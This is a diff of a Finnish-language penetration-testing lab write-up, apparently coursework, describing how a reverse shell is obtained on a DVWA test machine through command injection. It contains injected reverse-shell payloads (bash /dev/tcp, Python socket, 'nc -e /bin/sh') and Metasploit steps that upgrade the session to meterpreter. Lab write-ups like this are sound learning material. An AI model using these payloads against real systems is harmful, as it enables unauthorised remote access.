@@ -45,6 +45,18 @@ Pitää asettaa oman koneen ip kohtaan LHOST  ```set lhost 192.168.252.4``` ja p
 
 Jotta reverse shell voidaan avata pitää dvwa sivulta lähettää komento shellin avaamiseksi. Sivulla https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet löytyy bashin komento joten kokeillaan sitä ensiksi. ```192.168.252.4; bash -i >& /dev/tcp/192.168.252.4/4444 0>&1``` syötetään tekstikenttään ja painetaan submit. Pari kertaa submittia painettuna täytyy tulla siihen tulokseen, että ei tällä komennolla ainakaan toimi. Joten kokeillaan toista. Kokeillaan pythonia ```192.168.252.4; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.252.4",4444))``` No ei sekään toiminut toivotulla tavalla. Sitten voisi kokeilla ihan perinteistä netcattia. ```192.168.252.4; nc -e /bin/sh 192.168.252.4 4444```. Sieltä saatiin jotain eloa, mutta ei saatu avattua reverse shelliä. Joten täytyy kokeilla jotain muuta.  
 ![image](https://user-images.githubusercontent.com/71498717/201360270-ccc591e2-fe0e-47fb-b90d-245ede2c99bb.png)  
+Kokeillaan saadaanko eri payloadilla parempia onnistumisia. Käytetään ```set payload cmd/unix/reverse_netcat``` ja asetukset pysyy samana joten ```exploit```. dvwa sivulla käyetään ```192.168.252.4; nc -e /bin/sh 192.168.252.4 4444``` ja saatiin shelli auki  
+![image](https://user-images.githubusercontent.com/71498717/201362357-6e2660d4-d1b1-4edc-88f0-e81c05d40a30.png)  
+![image](https://user-images.githubusercontent.com/71498717/201362442-dca05cf9-52d9-4337-9762-92b1669bd233.png)  
+
+Seuraavaksi yritetään päivittää yhteys meterpreter yhteyteen. Painetaan ```ctrl + z``` ja ```sessions -u 1``` ja saatin päivitettyä yhteys parempaan. ```Sessions 2``` komennolla avataan oikea sessio.
+
+![image](https://user-images.githubusercontent.com/71498717/201365171-55dc484a-f430-417f-bc8f-0a053e7a1cb8.png)  
+
+![image](https://user-images.githubusercontent.com/71498717/201366840-12b74fdf-de94-43be-a77f-49e0e1d6c3ab.png)  
+
+Ja näin pääsimme koneeseen sisään.
+
 
 
 
